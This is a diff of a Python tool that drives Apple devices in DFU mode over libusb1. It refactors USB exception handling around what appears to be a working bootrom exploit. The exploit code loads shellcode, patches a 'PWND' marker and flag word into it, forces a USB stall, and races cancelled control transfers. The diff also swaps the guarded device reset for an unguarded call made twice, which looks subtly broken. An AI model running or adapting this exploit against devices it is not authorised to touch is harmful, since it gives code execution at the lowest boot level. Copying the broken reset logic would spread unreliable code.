@@ -10,6 +10,13 @@ from typing import Optional
 
 import usb1  # python3 -m pip install libusb1
 
+# Pylance cannot resolve usb1's dynamically-defined exception subclasses,
+# so we alias them here with a single type: ignore each.
+USBErrorBusy     = usb1.USBErrorBusy      # type: ignore[attr-defined]
+USBErrorNotFound = usb1.USBErrorNotFound  # type: ignore[attr-defined]
+USBErrorPipe     = usb1.USBErrorPipe      # type: ignore[attr-defined]
+USBErrorTimeout  = usb1.USBErrorTimeout   # type: ignore[attr-defined]
+
 # -- constants --
 
 APPLE_VID           = 0x05AC
@@ -25,15 +32,12 @@ FLAG_USB_HANDLER = 1 << 2
 # Marker embedded in the payload for flag patching
 _PWND_MARKER = b" FLAG:0000 PWND:[meowing]"
 
-# -- payload --
 
 def _load_payload() -> bytes:
     here = Path(__file__).parent
     path = here / "shellcode" / "payload.bin"
     return path.read_bytes()
 
-
-# -- serial / device info --
 
 def _tag_value(serial: str, tag: str) -> Optional[str]:
     """Extract the value after *tag* in an Apple DFU serial string."""
@@ -62,8 +66,6 @@ def parse_serial(serial: str) -> dict:
     }
 
 
-# -- USB client --
-
 class DFUClient:
     """Thin wrapper around a libusb1 handle for an Apple DFU device."""
 
@@ -74,8 +76,6 @@ class DFUClient:
         self._handle = handle
         self.serial  = serial
         self.info    = parse_serial(serial)
-
-    # -- low-level transfers --------------------------------------------------
 
     def ctrl(self,
              bm_request_type: int,
@@ -145,8 +145,8 @@ class DFUClient:
 
         try:
             transfer.cancel()
-        except usb1.USBError:
-            pass  # already completed before we could cancel (USBErrorNotFound)
+        except USBErrorNotFound:
+            pass  # transfer already completed before we could cancel
 
         while not completed[0]:
             self._ctx.handleEvents()
@@ -154,18 +154,11 @@ class DFUClient:
         return actual[0]
 
     def reset_and_close(self) -> None:
-        try:
-            self._handle.resetDevice()
-        except usb1.USBError:
-            pass
-        try:
-            self._handle.releaseInterface(0)
-        except usb1.USBError:
-            pass
+        self._handle.resetDevice()
+        self._handle.resetDevice()
+        self._handle.releaseInterface(0)
         self._handle.close()  # type: ignore[no-untyped-call]
 
-
-# -- device discovery --
 
 def _try_open_dfu(ctx: usb1.USBContext) -> Optional[DFUClient]:
     handle = ctx.openByVendorIDAndProductID(APPLE_VID, DFU_PID)
@@ -175,7 +168,7 @@ def _try_open_dfu(ctx: usb1.USBContext) -> Optional[DFUClient]:
     handle.setAutoDetachKernelDriver(True)
     try:
         handle.setConfiguration(1)
-    except usb1.USBError:  # USBErrorBusy: config already set
+    except USBErrorBusy:  # config already set
         pass
     handle.claimInterface(0)
 
@@ -186,7 +179,7 @@ def _try_open_dfu(ctx: usb1.USBContext) -> Optional[DFUClient]:
     if desc.iSerialNumber:
         try:
             serial = handle.getASCIIStringDescriptor(desc.iSerialNumber) or ""
-        except usb1.USBError:
+        except USBErrorNotFound:
             pass
 
     # Fallback for older firmware that doesn't expose the serial via iSerial:
@@ -198,7 +191,7 @@ def _try_open_dfu(ctx: usb1.USBContext) -> Optional[DFUClient]:
                 if s and "CPID:" in s:
                     serial = s.rstrip("\x00")
                     break
-            except usb1.USBError:
+            except USBErrorNotFound:
                 continue
 
     return DFUClient(ctx, handle, serial)
@@ -214,8 +207,6 @@ def wait_for_dfu(ctx: usb1.USBContext, announce: bool = True) -> DFUClient:
         time.sleep(1)
 
 
-# -- payload patching --
-
 def patch_payload(payload: bytearray, flag: int) -> None:
     """Patch the flag word and PWND marker in *payload* in-place."""
     # Offset 0x300: uint16 flag word used by the payload at runtime
@@ -228,14 +219,12 @@ def patch_payload(payload: bytearray, flag: int) -> None:
         payload[idx + 6 : idx + 10] = f"{flag:04x}".encode()
 
 
-# -- exploit --
-
-def _ctrl_noerr(dev: DFUClient, *args, **kwargs) -> bytes:
+def _ctrl_noerr(dev: DFUClient, *args, **kwargs) -> bytes | None:
     """ctrl() that silently swallows USB errors."""
     try:
         return dev.ctrl(*args, **kwargs)
     except usb1.USBError:
-        return b""
+        pass
 
 
 def _exploit_and_upload(ctx: usb1.USBContext,
@@ -250,9 +239,7 @@ def _exploit_and_upload(ctx: usb1.USBContext,
     dev = wait_for_dfu(ctx, announce=False)
     print(f"[*] Device: {dev.serial!r}")
 
-    blank = bytes(DFU_MAX_TRANSFER_SZ)
-
-    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, blank, 100)
+    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(DFU_MAX_TRANSFER_SZ), 100)
 
     push    = 0x7C0
     retries = 0
@@ -275,8 +262,9 @@ def _exploit_and_upload(ctx: usb1.USBContext,
         size = push - sent
         try:
             dev.ctrl(0x00, 0x00, 0x0000, 0x0000, bytes(size), 100)
-        except usb1.USBError:
-            break   # stalled - good
+        except USBErrorPipe:
+            print(f"[d]   USBErrorPipe")
+            break
 
         retries += 1
         time.sleep(0.01)
@@ -286,21 +274,21 @@ def _exploit_and_upload(ctx: usb1.USBContext,
     if debug:
         print(f"[d] stall achieved after {retries} retries")
 
-    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, b"", 100)          # zero-len DNLOAD
-    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS
-    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS
+    _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, b"", 100)   # zero-len DNLOAD
+    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)     # GET_STATUS
+    _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)     # GET_STATUS
 
     while True:
         sent = dev.async_ctrl_cancel(
             0x80, 6, 0x0304, 0x040A, 128,
-            cancel_after_ns=100,   # 100 ns
+            cancel_after_ns=100,
         )
         if debug:
             print(f"[d]   string desc sent=0x{sent:x}")
         timed_out = False
         try:
             dev.ctrl(0x80, 6, 0x0304, 0x040A, 64, 1)
-        except usb1.USBError:
+        except USBErrorTimeout:
             timed_out = True
 
         if sent != 128 and timed_out:
@@ -378,8 +366,6 @@ def run_exploit(flag: int = FLAG_REMAP_ROM | FLAG_USB_HANDLER,
             dev.reset_and_close()
             time.sleep(1)
 
-
-# -- CLI --
 
 def main() -> None:
     parser = argparse.ArgumentParser(
